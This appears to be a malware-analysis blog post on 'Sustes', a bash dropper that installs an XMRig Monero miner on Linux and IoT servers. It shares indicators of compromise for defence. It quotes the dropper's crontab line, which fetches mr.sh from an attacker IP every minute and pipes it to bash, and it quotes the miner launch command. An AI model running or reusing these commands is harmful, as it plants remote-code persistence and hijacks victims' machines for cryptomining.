Today I’d like to share a simple analysis based on fascinating threat that I like to call Sustes (you will see name genesis in a bit).
Everybody knows Monero crypto currency and probably everybody knows that it has built upon privacy, by meaning It’s not that
simple to figure out Monero wallet balance. Sustes (mr.sh) is a nice example of Pirate-Mining and even if it’s hard to figure out its
magnitude, since the attacker built-up private pool-proxies, I believe it’s interesting to fix wallet address in memories and to share
IoC for future Protection. So, let’s have a closer look to it.

Monero stops you trying to check wallet balance
Sustes Malware doesn’t infect victims by itself (it’s not a worm) but it is spread over exploitation and brute-force activities with
special focus on IoT and Linux servers. The initial infection stage comes from a custom wget
(http:\/\/192[.]99[.]142[.]226[:]8220\/mr.sh ) directly on the victim machine followed by a simple /bin/bash mr.sh. The script is a
simple bash script which drops and executes additional software with a bit of spicy. The following code represents the mr.sh content
as a today (ref. blog post date).

An initial connection-check wants to take down unwanted software on the victim side (awk ‘{print $7}’ | sed -e “s/\/.*//g”) taking
decisions upon specific IP addresses. It filters PID from connection states and it directly kills them (kill -9). The extracted attacker’s
unwanted communications are the following ones:
103[.]99[.]115[.]220 (Org: HOST EDU (OPC) PRIVATE LIMITED, Country: IN)
104[.]160[.]171[.]94 (Org: Sharktech Country: USA)

A second check comes from “command lines arguments”. Sustes “greps” to search for configuration files (for example: wc.conf and
wq.conf and wm.conf) then it looks for software names such as sustes (here we go !) and kills everything matches the “grep”. The
script follows by assigning to f2 variable the dropping website (192[.]99[.]142[.]226:8220) and later-on it calls “f2” adding specific
paths (for example: /xm64 and wt.conf) in order to drop crafted components. MR.sh follows by running the dropped software with
configuration file as follows:
nohup $DIR/sustes -c $DIR/wc.conf > /dev/null 2>&1 &
MR.SH ends up by setting a periodic crontab action on dropping and executing itself by setting up:
crontab -l 2>/dev/null; echo “* * * * * $LDR http://192.99.142.226:8220/mr.sh | bash -sh > /dev/null 2>&1”
Following the analysis and extracting the configuration file from dropping URL we might observe the Monero wallet addresses and
the Monero Pools used by attacker. The following wallets (W1, W2, W3) were found.

Quick analyses on the used Monero pools took me to believe the attacker built up a custom and private (deployed on private
infrastructures) monero pool/proxies, for such a reason I believe it would be nice to monitor and/or block the following addresses:
158[.]69[.]133[.]20 on port 3333
192[.]99[.]142[.]249 on port 3333
202[.]144[.]193[.]110 on port 3333
The downloaded payload is named sustes and it is a basic XMRIG, which is a well-known opensource miner. In this scenario it is
used to make money at the expense of computer users by abusing the infected computer to mine Monero, a cryptocurrency. The
following image shows the usage strings as an initial proof of software.

XMRIG prove 1
Many people are currently wondering what is the sustes process which is draining a lot of PC resources (for example: here, here
and here ) …. now we have an answer: it’s a unwanted Miner. :D.
Hope you had fun
